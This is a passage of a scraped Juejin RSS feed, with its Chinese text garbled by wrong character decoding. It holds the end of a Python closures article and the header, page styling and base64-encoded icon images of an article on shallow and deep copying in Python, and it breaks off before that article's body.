<li>é—­åŒ…é€‚ç”¨äºè½»é‡çº§çŠ¶æ€ç®¡ç†ã€è£…é¥°å™¨å®ç°ã€å»¶è¿Ÿæ‰§è¡Œç­‰åœºæ™¯ï¼Œæ˜¯å‡½æ•°å¼ç¼–ç¨‹çš„é‡è¦å·¥å…·ï¼Œä½†å…¶å¯è¯»æ€§éœ€ä¸å¤æ‚åº¦æƒè¡¡</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ·±å…¥ç†è§£ Python ä¸­çš„æ·±æµ…æ‹·è´ï¼ˆShallow Copy & Deep Copyï¼‰ï¼šé¿å…æ•°æ®å¼•ç”¨çš„ â€œå‘â€]]></title>    <link>https://juejin.cn/post/7589932422654214180</link>    <guid>https://juejin.cn/post/7589932422654214180</guid>    <pubDate>2026-01-02T07:59:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589932422654214180" data-draft-id="7589655730293014568" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ·±å…¥ç†è§£ Python ä¸­çš„æ·±æµ…æ‹·è´ï¼ˆShallow Copy &amp; Deep Copyï¼‰ï¼šé¿å…æ•°æ®å¼•ç”¨çš„ â€œå‘â€"/> <meta itemprop="keywords" content="Python"/> <meta itemprop="datePublished" content="2026-01-02T07:59:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="åƒè¥¿çº¢æŸ¿é•¿å¤§çš„ç•ªèŒ„"/> <meta itemprop="url" content="https://juejin.cn/user/3097787706900985"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ·±å…¥ç†è§£ Python ä¸­çš„æ·±æµ…æ‹·è´ï¼ˆShallow Copy &amp; Deep Copyï¼‰ï¼šé¿å…æ•°æ®å¼•ç”¨çš„ â€œå‘â€
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3097787706900985/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    åƒè¥¿çº¢æŸ¿é•¿å¤§çš„ç•ªèŒ„
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T07:59:59.000Z" title="Fri Jan 02 2026 07:59:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252b3a}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px;color:#5e7ce0}.markdown-body h1{font-size:24px;margin-bottom:5px;margin-top:80px;position:relative;text-align:center}.markdown-body h2{font-size:20px;padding-bottom:12px;border-bottom:1px solid #dfe1e6}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h4{font-size:16px;margin-top:30px}.markdown-body h5{font-size:14px;margin-top:20px}.markdown-body h6{font-size:14px;margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #dfe1e6;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#ffeeed;color:#c73636;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#252b3a;background:#f8f8f8}.markdown-body a{position:relative;text-decoration:none;color:#5e7ce0;padding-right:18px;padding-bottom:4px}.markdown-body a[href^=http]:after{position:absolute;display:inline-block;width:16px;height:16px;margin-left:2px;margin-top:6px;content:"";background:url("data:image/png;base64,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");background-size:100%}.markdown-body a:active,.markdown-body a:hover{border-bottom:2px solid #5e7ce0}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #5e7ce0;border-spacing:0}.markdown-body thead{color:#fff;text-align:left}.markdown-body thead tr{background:#5e7ce0}.markdown-body thead th{border-bottom:1px solid #dfe1e6}.markdown-body tr{background-color:#fff}.markdown-body tr:nth-child(2n){background-color:#f2f5fc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#252b3a;padding:1px 23px;margin:22px 0;border-left:4px solid #5e7ce0;background-color:#f2f5fc}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{padding-left:10px;margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#5e7ce0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body ul li::marker{content:"â€¢";color:#5e7ce0}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}.markdown-body input[type=checkbox]:before{display:inline-block;width:16px;height:16px;content:"";background:url("data:image/png;base64,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");background-size:100%;position:relative;right:2px;top:-5px}.markdown-body input[type=checkbox]:checked:before{background:url("data:image/png;base64,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